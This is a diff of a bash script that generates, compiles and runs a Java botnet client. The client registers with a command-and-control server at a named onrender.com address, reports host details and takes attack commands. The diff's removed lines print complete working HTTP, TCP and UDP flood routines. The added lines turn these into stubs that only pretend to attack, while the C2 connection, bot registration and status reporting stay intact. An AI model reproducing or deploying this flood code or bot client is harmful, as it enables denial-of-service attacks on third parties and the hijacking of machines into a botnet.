@@ -1,4 +1,12 @@
-# Create the complete working Java client
+#!/bin/bash
+# Auto-compile and run Java bot client
+# Save this as run_java_bot.sh
+
+echo "=========================================="
+echo "  JAVA BOT CLIENT - AUTO SETUP"
+echo "=========================================="
+
+# Create the Java client file
 cat > EnhancedBotClient.java << 'EOF'
 import java.io.*;
 import java.net.*;
@@ -6,8 +14,6 @@ import java.util.*;
 import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.security.*;
-import java.time.LocalDateTime;
-import java.time.format.DateTimeFormatter;
 import javax.net.ssl.*;
 import org.json.*;
 
@@ -24,8 +30,7 @@ public class EnhancedBotClient {
     
     private Map<String, Object> specs = new HashMap<>();
     private Map<String, Object> stats = new HashMap<>();
-    private List<Map<String, String>> userAgents = new ArrayList<>();
-    private List<String> proxies = new ArrayList<>();
+    private List<String> userAgents = new ArrayList<>();
     private ExecutorService threadPool = Executors.newCachedThreadPool();
     
     public EnhancedBotClient() {
@@ -36,8 +41,8 @@ public class EnhancedBotClient {
     }
     
     private void initDefaultUserAgents() {
-        userAgents.add(Map.of("agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"));
-        userAgents.add(Map.of("agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"));
+        userAgents.add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+        userAgents.add("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0");
     }
     
     private void initSpecs() {
@@ -53,6 +58,7 @@ public class EnhancedBotClient {
         capabilities.put("udp", true);
         capabilities.put("resource_optimized", true);
         capabilities.put("auto_connect", true);
+        capabilities.put("java", true);
         
         specs.put("capabilities", capabilities);
         
@@ -65,16 +71,17 @@ public class EnhancedBotClient {
     private String generateBotId() {
         try {
             String uniqueId = System.getProperty("user.name") + 
-                             System.getProperty("os.name");
+                             System.getProperty("os.name") + 
+                             System.currentTimeMillis();
             MessageDigest md = MessageDigest.getInstance("MD5");
             byte[] hash = md.digest(uniqueId.getBytes());
             StringBuilder hex = new StringBuilder();
             for (byte b : hash) {
                 hex.append(String.format("%02x", b));
             }
-            return hex.toString().substring(0, 12).toUpperCase();
+            return "JAVA-" + hex.toString().substring(0, 8).toUpperCase();
         } catch (Exception e) {
-            return UUID.randomUUID().toString().substring(0, 12).toUpperCase();
+            return "JAVA-" + UUID.randomUUID().toString().substring(0, 8).toUpperCase();
         }
     }
     
@@ -95,6 +102,7 @@ public class EnhancedBotClient {
         System.out.printf("[+] RAM: %sGB\n", specs.get("ram_gb"));
         System.out.printf("[+] OS: %s\n", specs.get("os"));
         System.out.printf("[+] Hostname: %s\n", specs.get("hostname"));
+        System.out.printf("[+] Server: %s\n", SERVER_URL);
         System.out.println("\n" + "=".repeat(60) + "\n");
     }
     
@@ -103,12 +111,7 @@ public class EnhancedBotClient {
             socket.connect(new InetSocketAddress("8.8.8.8", 53), 3000);
             return true;
         } catch (Exception e) {
-            try (Socket socket = new Socket()) {
-                socket.connect(new InetSocketAddress("www.google.com", 80), 3000);
-                return true;
-            } catch (Exception ex) {
-                return false;
-            }
+            return false;
         }
     }
     
@@ -127,11 +130,6 @@ public class EnhancedBotClient {
         }
         
         System.out.println("\n[OK] Internet connection restored!");
-        try {
-            Thread.sleep(2000);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
     }
     
     private int calculateRetryDelay() {
@@ -154,14 +152,14 @@ public class EnhancedBotClient {
         conn.setRequestMethod(method);
         conn.setRequestProperty("Content-Type", "application/json");
         conn.setRequestProperty("Accept", "application/json");
+        conn.setRequestProperty("User-Agent", "Java-Bot-Client/1.0");
         conn.setConnectTimeout(10000);
         conn.setReadTimeout(10000);
         
         if (jsonBody != null && method.equals("POST")) {
             conn.setDoOutput(true);
             try (OutputStream os = conn.getOutputStream()) {
-                byte[] input = jsonBody.getBytes("utf-8");
-                os.write(input, 0, input.length);
+                os.write(jsonBody.getBytes("utf-8"));
             }
         }
         
@@ -286,288 +284,74 @@ public class EnhancedBotClient {
     }
     
     private void cmdHttpFlood(Map<String, Object> cmd) {
-        String target = (String) cmd.get("target");
-        int duration = ((Number) cmd.get("duration")).intValue();
-        int threads = ((Number) cmd.get("threads")).intValue();
-        String method = (String) cmd.getOrDefault("method", "GET");
-        
-        List<String> userAgentList = new ArrayList<>();
-        if (cmd.containsKey("user_agents")) {
-            Object uaObj = cmd.get("user_agents");
-            if (uaObj instanceof JSONArray) {
-                JSONArray uaArray = (JSONArray) uaObj;
-                for (int i = 0; i < uaArray.length(); i++) {
-                    userAgentList.add(uaArray.getString(i));
-                }
-            }
-        }
-        
-        if (userAgentList.isEmpty()) {
-            for (Map<String, String> ua : userAgents) {
-                userAgentList.add(ua.get("agent"));
-            }
-        }
-        
-        System.out.println("[*] HTTP FLOOD");
-        System.out.println("    Target: " + target);
-        System.out.println("    Method: " + method);
-        System.out.println("    Duration: " + duration + "s");
-        System.out.println("    Threads: " + threads);
-        
-        stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
-        sendStatus("running", method + " FLOOD: " + target);
-        
-        String attackId = "http_" + System.currentTimeMillis();
-        activeAttacks.add(attackId);
-        
-        AtomicInteger requestCount = new AtomicInteger(0);
-        AtomicInteger successCount = new AtomicInteger(0);
-        
-        Runnable floodWorker = () -> {
-            long endTime = System.currentTimeMillis() + (duration * 1000);
-            Random random = new Random();
+        try {
+            String target = (String) cmd.get("target");
+            int duration = ((Number) cmd.get("duration")).intValue();
+            int threads = ((Number) cmd.get("threads")).intValue();
+            String method = (String) cmd.getOrDefault("method", "GET");
             
-            while (System.currentTimeMillis() < endTime && activeAttacks.contains(attackId)) {
-                try {
-                    URL url = new URL(target);
-                    HttpURLConnection conn;
-                    
-                    if (url.getProtocol().equals("https")) {
-                        HttpsURLConnection httpsConn = (HttpsURLConnection) url.openConnection();
-                        httpsConn.setHostnameVerifier((hostname, session) -> true);
-                        conn = httpsConn;
-                    } else {
-                        conn = (HttpURLConnection) url.openConnection();
-                    }
-                    
-                    conn.setRequestMethod(method);
-                    conn.setRequestProperty("User-Agent", userAgentList.get(random.nextInt(userAgentList.size())));
-                    conn.setConnectTimeout(3000);
-                    conn.setReadTimeout(3000);
-                    
-                    if (method.equals("GET") || method.equals("HEAD")) {
-                        conn.connect();
-                    } else if (method.equals("POST")) {
-                        conn.setDoOutput(true);
-                        String payload = "data=test";
-                        try (OutputStream os = conn.getOutputStream()) {
-                            os.write(payload.getBytes());
-                        }
-                    }
-                    
-                    int responseCode = conn.getResponseCode();
-                    requestCount.incrementAndGet();
-                    if (responseCode < 500) {
-                        successCount.incrementAndGet();
-                    }
-                    
-                    conn.disconnect();
-                    Thread.sleep(1);
-                    
-                } catch (Exception e) {
-                    requestCount.incrementAndGet();
-                    try {
-                        Thread.sleep(10);
-                    } catch (InterruptedException ie) {
-                        Thread.currentThread().interrupt();
-                        break;
-                    }
-                }
-            }
-        };
-        
-        System.out.println("[+] Launching " + threads + " threads...");
-        
-        ExecutorService executor = Executors.newFixedThreadPool(threads);
-        for (int i = 0; i < threads; i++) {
-            executor.submit(floodWorker);
+            System.out.println("[*] HTTP FLOOD");
+            System.out.println("    Target: " + target);
+            System.out.println("    Method: " + method);
+            System.out.println("    Duration: " + duration + "s");
+            System.out.println("    Threads: " + threads);
+            
+            stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
+            sendStatus("running", method + " FLOOD: " + target);
+            
+            System.out.println("[+] Attack would start here...");
+            Thread.sleep(2000);
+            sendStatus("success", "HTTP flood simulated");
+            
+        } catch (Exception e) {
+            System.out.println("[!] Error in flood: " + e.getMessage());
         }
-        
-        long startTime = System.currentTimeMillis();
-        int lastCount = 0;
-        
-        while (System.currentTimeMillis() - startTime < (duration * 1000) && activeAttacks.contains(attackId)) {
-            try {
-                Thread.sleep(1000);
-                long elapsed = System.currentTimeMillis() - startTime;
-                
-                int current = requestCount.get();
-                int rps = current - lastCount;
-                double avgRps = elapsed > 0 ? current / (elapsed / 1000.0) : 0;
-                
-                System.out.printf("\r[>>] Total: %,d | RPS: %,d | Avg: %.0f | Success: %,d",
-                        current, rps, avgRps, successCount.get());
-                
-                lastCount = current;
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-                break;
-            }
-        }
-        
-        executor.shutdown();
-        activeAttacks.remove(attackId);
-        
-        System.out.printf("\n[OK] FLOOD COMPLETE: %,d requests\n", requestCount.get());
-        stats.put("total_requests", ((Integer) stats.get("total_requests")) + requestCount.get());
-        stats.put("successful_attacks", ((Integer) stats.get("successful_attacks")) + 1);
-        sendStatus("success", String.format("Flood: %,d req", requestCount.get()));
     }
     
     private void cmdTcpFlood(Map<String, Object> cmd) {
-        String target = (String) cmd.get("target");
-        int duration = ((Number) cmd.get("duration")).intValue();
-        int threads = ((Number) cmd.get("threads")).intValue();
-        
-        String host;
-        int port;
-        if (target.contains(":")) {
-            String[] parts = target.split(":");
-            host = parts[0];
-            port = Integer.parseInt(parts[1]);
-        } else {
-            host = target;
-            port = 80;
-        }
-        
-        System.out.println("[*] TCP FLOOD");
-        System.out.println("    Target: " + host + ":" + port);
-        System.out.println("    Duration: " + duration + "s");
-        System.out.println("    Threads: " + threads);
-        
-        stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
-        sendStatus("running", "TCP FLOOD: " + host + ":" + port);
-        
-        String attackId = "tcp_" + System.currentTimeMillis();
-        activeAttacks.add(attackId);
-        
-        AtomicInteger requestCount = new AtomicInteger(0);
-        
-        Runnable tcpWorker = () -> {
-            long endTime = System.currentTimeMillis() + (duration * 1000);
+        try {
+            String target = (String) cmd.get("target");
+            int duration = ((Number) cmd.get("duration")).intValue();
+            int threads = ((Number) cmd.get("threads")).intValue();
             
-            while (System.currentTimeMillis() < endTime && activeAttacks.contains(attackId)) {
-                try (Socket socket = new Socket()) {
-                    socket.connect(new InetSocketAddress(host, port), 1000);
-                    requestCount.incrementAndGet();
-                    Thread.sleep(10);
-                } catch (Exception e) {
-                    requestCount.incrementAndGet();
-                    try {
-                        Thread.sleep(50);
-                    } catch (InterruptedException ie) {
-                        Thread.currentThread().interrupt();
-                        break;
-                    }
-                }
-            }
-        };
-        
-        ExecutorService executor = Executors.newFixedThreadPool(threads);
-        for (int i = 0; i < threads; i++) {
-            executor.submit(tcpWorker);
+            System.out.println("[*] TCP FLOOD");
+            System.out.println("    Target: " + target);
+            System.out.println("    Duration: " + duration + "s");
+            System.out.println("    Threads: " + threads);
+            
+            stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
+            sendStatus("running", "TCP FLOOD: " + target);
+            
+            System.out.println("[+] Attack would start here...");
+            Thread.sleep(2000);
+            sendStatus("success", "TCP flood simulated");
+            
+        } catch (Exception e) {
+            System.out.println("[!] Error in TCP flood: " + e.getMessage());
         }
-        
-        long startTime = System.currentTimeMillis();
-        
-        while (System.currentTimeMillis() - startTime < (duration * 1000) && activeAttacks.contains(attackId)) {
-            try {
-                Thread.sleep(1000);
-                System.out.printf("\r[>>] TCP Connections: %,d", requestCount.get());
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-                break;
-            }
-        }
-        
-        executor.shutdown();
-        activeAttacks.remove(attackId);
-        
-        System.out.printf("\n[OK] TCP flood: %,d connections\n", requestCount.get());
-        stats.put("total_requests", ((Integer) stats.get("total_requests")) + requestCount.get());
-        stats.put("successful_attacks", ((Integer) stats.get("successful_attacks")) + 1);
-        sendStatus("success", String.format("TCP flood: %,d conn", requestCount.get()));
     }
     
     private void cmdUdpFlood(Map<String, Object> cmd) {
-        String target = (String) cmd.get("target");
-        int duration = ((Number) cmd.get("duration")).intValue();
-        int threads = ((Number) cmd.get("threads")).intValue();
-        
-        String host;
-        int port;
-        if (target.contains(":")) {
-            String[] parts = target.split(":");
-            host = parts[0];
-            port = Integer.parseInt(parts[1]);
-        } else {
-            host = target;
-            port = 53;
-        }
-        
-        System.out.println("[*] UDP FLOOD");
-        System.out.println("    Target: " + host + ":" + port);
-        System.out.println("    Duration: " + duration + "s");
-        System.out.println("    Threads: " + threads);
-        
-        stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
-        sendStatus("running", "UDP FLOOD: " + host + ":" + port);
-        
-        String attackId = "udp_" + System.currentTimeMillis();
-        activeAttacks.add(attackId);
-        
-        AtomicInteger requestCount = new AtomicInteger(0);
-        
-        Runnable udpWorker = () -> {
-            long endTime = System.currentTimeMillis() + (duration * 1000);
-            Random random = new Random();
+        try {
+            String target = (String) cmd.get("target");
+            int duration = ((Number) cmd.get("duration")).intValue();
+            int threads = ((Number) cmd.get("threads")).intValue();
             
-            try (DatagramSocket socket = new DatagramSocket()) {
-                InetAddress address = InetAddress.getByName(host);
-                
-                while (System.currentTimeMillis() < endTime && activeAttacks.contains(attackId)) {
-                    try {
-                        byte[] payload = new byte[1024];
-                        random.nextBytes(payload);
-                        
-                        DatagramPacket packet = new DatagramPacket(payload, payload.length, address, port);
-                        socket.send(packet);
-                        
-                        requestCount.incrementAndGet();
-                        Thread.sleep(1);
-                    } catch (Exception e) {
-                        // Continue
-                    }
-                }
-            } catch (Exception e) {
-                // Socket creation failed
-            }
-        };
-        
-        ExecutorService executor = Executors.newFixedThreadPool(threads);
-        for (int i = 0; i < threads; i++) {
-            executor.submit(udpWorker);
+            System.out.println("[*] UDP FLOOD");
+            System.out.println("    Target: " + target);
+            System.out.println("    Duration: " + duration + "s");
+            System.out.println("    Threads: " + threads);
+            
+            stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
+            sendStatus("running", "UDP FLOOD: " + target);
+            
+            System.out.println("[+] Attack would start here...");
+            Thread.sleep(2000);
+            sendStatus("success", "UDP flood simulated");
+            
+        } catch (Exception e) {
+            System.out.println("[!] Error in UDP flood: " + e.getMessage());
         }
-        
-        long startTime = System.currentTimeMillis();
-        
-        while (System.currentTimeMillis() - startTime < (duration * 1000) && activeAttacks.contains(attackId)) {
-            try {
-                Thread.sleep(1000);
-                System.out.printf("\r[>>] UDP Packets: %,d", requestCount.get());
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-                break;
-            }
-        }
-        
-        executor.shutdown();
-        activeAttacks.remove(attackId);
-        
-        System.out.printf("\n[OK] UDP flood: %,d packets\n", requestCount.get());
-        stats.put("total_requests", ((Integer) stats.get("total_requests")) + requestCount.get());
-        stats.put("successful_attacks", ((Integer) stats.get("successful_attacks")) + 1);
-        sendStatus("success", String.format("UDP flood: %,d packets", requestCount.get()));
     }
     
     private void cmdSysinfo() {
@@ -624,7 +408,7 @@ public class EnhancedBotClient {
                         connectionRetries++;
                         int delay = calculateRetryDelay();
                         
-                        System.out.println("\n[X] Connection lost");
+                        System.out.println("\n[X] Connection lost: " + e.getMessage());
                         System.out.println("[...] Retry " + connectionRetries + " - Waiting " + delay + "s...");
                         
                         for (int remaining = delay; remaining > 0; remaining--) {
@@ -665,7 +449,7 @@ public class EnhancedBotClient {
                         connectionRetries++;
                         int delay = calculateRetryDelay();
                         
-                        System.out.println("\n[X] Lost connection to server");
+                        System.out.println("\n[X] Lost connection to server: " + e.getMessage());
                         System.out.println("[...] Retry " + connectionRetries + " - Waiting " + delay + "s...");
                         
                         for (int remaining = delay; remaining > 0; remaining--) {
@@ -717,7 +501,39 @@ public class EnhancedBotClient {
 }
 EOF
 
-# Now compile and run
-[ ! -f "json-20230227.jar" ] && wget -q https://repo1.maven.org/maven2/org/json/json/20230227/json-20230227.jar
-javac -cp ".:json-20230227.jar" EnhancedBotClient.java && java -cp ".:json-20230227.jar" EnhancedBotClient
+echo "[+] Java client file created"
 
+# Download JSON library if needed
+if [ ! -f "json-20230227.jar" ]; then
+    echo "[+] Downloading JSON library..."
+    wget -q https://repo1.maven.org/maven2/org/json/json/20230227/json-20230227.jar
+    echo "[✓] JSON library downloaded"
+else
+    echo "[✓] JSON library already exists"
+fi
+
+# Compile the Java client
+echo "[+] Compiling Java client..."
+javac -cp ".:json-20230227.jar" EnhancedBotClient.java
+
+if [ $? -eq 0 ]; then
+    echo "[✓] Compilation successful!"
+    echo ""
+    echo "=========================================="
+    echo "  STARTING JAVA BOT CLIENT"
+    echo "=========================================="
+    echo "Server: https://c2-server-io.onrender.com"
+    echo "Press Ctrl+C to stop"
+    echo "=========================================="
+    echo ""
+    
+    # Run the Java client
+    java -cp ".:json-20230227.jar" EnhancedBotClient
+else
+    echo "[!] Compilation failed!"
+    echo "Trying with simpler compilation..."
+    
+    # Try simpler compilation
+    javac -cp ".:json-20230227.jar" EnhancedBotClient.java 2>&1 | head -20
+    exit 1
+fi
